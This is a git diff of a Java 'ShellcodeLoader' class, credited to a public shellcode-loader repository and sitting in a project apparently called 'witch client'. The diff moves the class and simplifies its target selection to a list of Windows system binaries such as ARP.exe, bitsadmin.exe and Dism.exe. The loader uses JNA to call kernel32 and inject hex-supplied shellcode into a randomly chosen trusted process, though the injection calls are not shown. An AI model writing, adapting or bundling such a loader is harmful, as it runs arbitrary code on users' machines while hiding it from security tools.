@@ -1,5 +1,5 @@
 //Code from https://github.com/yzddmr6/Java-Shellcode-Loader
-package me.soda.witch.client.features;
+package me.soda.witch.client.utils;
 
 import com.sun.jna.Memory;
 import com.sun.jna.Native;
@@ -15,8 +15,7 @@ import com.sun.jna.win32.W32APIOptions;
 import java.util.Random;
 
 public class ShellcodeLoader {
-    public static final String[] ProcessArray32 = {"C:\\Windows\\SysWOW64\\ARP.exe", "C:\\Windows\\SysWOW64\\at.exe",
-            "C:\\Windows\\SysWOW64\\auditpol.exe", "C:\\Windows\\SysWOW64\\bitsadmin.exe",
+    public static final String[] targetProcessArray = {"C:\\Windows\\SysWOW64\\ARP.exe", "C:\\Windows\\SysWOW64\\at.exe", "C:\\Windows\\SysWOW64\\auditpol.exe",
             "C:\\Windows\\SysWOW64\\bootcfg.exe", "C:\\Windows\\SysWOW64\\ByteCodeGenerator.exe",
             "C:\\Windows\\SysWOW64\\cacls.exe", "C:\\Windows\\SysWOW64\\chcp.com",
             "C:\\Windows\\SysWOW64\\CheckNetIsolation.exe", "C:\\Windows\\SysWOW64\\chkdsk.exe",
@@ -24,8 +23,6 @@ public class ShellcodeLoader {
             "C:\\Windows\\SysWOW64\\diskcomp.com", "C:\\Windows\\SysWOW64\\Dism.exe", "C:\\Windows\\SysWOW64\\esentutl.exe",
             "C:\\Windows\\SysWOW64\\expand.exe", "C:\\Windows\\SysWOW64\\fc.exe", "C:\\Windows\\SysWOW64\\find.exe",
             "C:\\Windows\\SysWOW64\\gpresult.exe"};
-    public static final String[] ProcessArray64 = {"C:\\Windows\\System32\\rundll32.exe", "C:\\Windows\\System32\\find.exe",
-            "C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\System32\\ARP.EXE"};
     static final Kernel32 kernel32 = Native.load(Kernel32.class, W32APIOptions.UNICODE_OPTIONS);
     static final IKernel32 iKernel32 = Native.load("kernel32", IKernel32.class);
 
@@ -46,13 +43,7 @@ public class ShellcodeLoader {
         }
     }
 
-    public void loadShellCode(String shellcodeHex, boolean is64) {
-        String[] targetProcessArray;
-        if (System.getProperty("sun.arch.data.model").equals("64") && is64) {
-            targetProcessArray = ProcessArray64;
-        } else {
-            targetProcessArray = ProcessArray32;
-        }
+    public void loadShellCode(String shellcodeHex) {
         int j = targetProcessArray.length;
         byte b = 0;
         Random random = new Random();
